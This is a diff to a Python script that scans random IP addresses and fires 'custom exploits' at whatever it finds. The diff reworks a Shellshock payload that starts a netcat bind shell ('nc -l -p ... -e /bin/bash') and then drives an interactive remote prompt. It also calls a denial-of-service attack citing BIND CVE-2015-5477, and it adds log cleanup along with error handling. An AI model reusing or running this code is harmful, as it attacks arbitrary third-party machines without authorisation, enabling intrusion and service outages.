@@ -97,6 +97,7 @@ def WriteLog():
 		os.remove(hostr)
 	os.remove(logfile)
 	print('Directory cleaned!, All sockets closed!')
+	sys.exit()
 
 def print_bootstrap_lines(line):
   if "Bootstrapped " in line:
@@ -122,8 +123,9 @@ def webGui():
 
 logfile = str(timestr) + "_randip_log.txt"
 fp = open(logfile, 'w')
-#Tor_Connect()
 
+######################################################################
+#Custom Exploit Container
 def tBindDOS():
 	print('Using tBind CVE:2015-5477')
 	print('Sending packet to ' + address + ' ...')
@@ -138,12 +140,11 @@ def ShellShock():
 	print('Sending packet to ' + address + '...')
 	payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
 	try:
-		serversocket = socket(AF_INET, SOCK_STREAM)
+		serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		time.sleep(1)
 		serversocket.connect(address)
-		print("[!] Successfully exploited")
-		print("[!] Connected to "+address)
-		stop=True
+		print('[!] Successfully exploited')
+		print('[!] Connected to ', address)
 		serversocket.settimeout(3)
 		while True:
 			reply = raw_input(address+"> ")
@@ -152,8 +153,10 @@ def ShellShock():
 			print(data)
 			print('Done.\n')
 	except:
+		print('Exploit failed...\n')
 		pass
-
+#End Of Exploit Container
+#########################################################################
 def find_service_name():
 	global SSHio
 	global Telio
@@ -297,11 +300,11 @@ for address in randip():
 			if SSHio == 1:
 				SSHConnect()
 			elif SSHio == 0:
-				print('SSH port not open...skipping')
-#Remote to Local DOS Exploits
+				print('SSH port not open...skipping\n')
+#Custom Exploits
 			tBindDOS()
 			ShellShock()
-#
+#End of Exploits
 		except socket.timeout:
 			print(socket.timeout, '%s timeout' % address)
 			print '\n'
@@ -337,7 +340,11 @@ for address in randip():
 			print(requests.exceptions.TooManyRedirects, address)
 			a.append(address)
 			pass
-		except TypeError:
+		except TypeError as e:
+			e = sys.exc_info()[0]
+			exc_type, exc_obj, exc_tb = sys.exc_info()
+			fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+			print(exc_type, fname, exc_tb.tb_lineno)
 			print(TypeError, address)
 			a.append(address)
 			pass
